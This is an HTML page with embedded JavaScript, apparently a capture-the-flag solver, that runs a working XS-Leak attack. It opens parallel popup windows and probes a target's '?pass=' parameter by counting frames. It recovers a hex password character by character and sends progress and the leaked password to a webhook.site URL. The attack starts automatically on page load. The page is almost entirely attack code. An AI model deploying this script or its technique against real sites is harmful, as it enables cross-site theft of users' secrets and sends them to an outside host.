<!DOCTYPE html>
<html>
<head>
    <title>XS-Leak Solver - Initial</title>
</head>
<body>
    <h1>Password Leak - Parallel Windows</h1>
    <pre id="output"></pre>
    
    <script>
        const TARGET = 'https://127.0.0.1:3000/';
        const WEBHOOK = 'https://webhook.site/a408d71b-0cc8-4104-a331-ccd4889d5836/';
        const CHARSET = '0123456789abcdef';

        function log(msg) {
            document.getElementById('output').textContent += msg + '\n';
        }

        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        const waitFor = async (f, timeout = 2000) => {
            const start = Date.now();
            while (true) {
                if (await f()) return true;
                if (Date.now() - start > timeout) return false;
                await sleep(5);
            }
        };

        // Open 8 windows for parallel testing
        const windows = [];
        for (let i = 0; i < 8; i++) {
            windows.push(window.open('about:blank'));
        }

        if (windows.some(w => !w)) {
            alert('Popup blocked! Please allow popups.');
            throw new Error('Popup blocked');
        }

        log(`Opened ${windows.length} windows for parallel testing\n`);

        // Check if a candidate password is a substring using a specific window
        async function checkWithWindow(win, candidate) {
            try {
                // Reset window
                win.location = 'about:blank';
                await waitFor(() => win.length === 0, 700);
                await sleep(20);
                
                // Navigate to target with candidate
                win.location = TARGET + '?pass=' + encodeURIComponent(candidate);
                
                // Wait for cross-origin (page loaded)
                await waitFor(() => {
                    try { 
                        win.origin; 
                        return false; 
                    } catch { 
                        return true; 
                    }
                }, 1200);
                
                await sleep(60);
                
                // Check if iframe exists
                return win.length > 0;
            } catch (e) {
                return false;
            }
        }

        // Test a batch of 8 characters in parallel
        async function testBatch(known, startIdx) {
            const batch = [];
            const promises = [];
            
            for (let i = 0; i < 8 && (startIdx + i) < CHARSET.length; i++) {
                const c = CHARSET[startIdx + i];
                batch.push(c);
                promises.push(checkWithWindow(windows[i], known + c));
            }
            
            log(`  Testing [${batch.join(' ')}]`);
            const results = await Promise.all(promises);
            
            for (let i = 0; i < results.length; i++) {
                if (results[i]) {
                    return batch[i];
                }
            }
            return null;
        }

        async function attack() {
            log('Starting parallel window attack...\n');
            
            fetch(WEBHOOK + '?status=started').catch(e => {});
            
            let known = 'lebah';
            
            // Try to leak 12 hex characters
            for (let pos = 0; pos < 12; pos++) {
                log(`Position ${pos + 1}/12:`);
                let found = false;
                
                // Test in batches of 8 (16 chars = 2 batches)
                for (let i = 0; i < CHARSET.length; i += 8) {
                    const char = await testBatch(known, i);
                    if (char) {
                        known += char;
                        log(`  Found: '${char}' -> ${known}\n`);
                        fetch(WEBHOOK + '?progress=' + known).catch(e => {});
                        found = true;
                        break;
                    }
                }
                
                if (!found) {
                    log(`  No match found\n`);
                    break;
                }
            }
            
            log('\n' + '='.repeat(40));
            log(`LEAKED PASSWORD: ${known}`);
            log('='.repeat(40));
            fetch(WEBHOOK + '?password=' + known).catch(e => {});
            
            // Clean up
            windows.forEach(w => {
                if (w && !w.closed) w.close();
            });
        }

        // Auto-start after page loads
        setTimeout(attack, 500);
    </script>
</body>
</html>
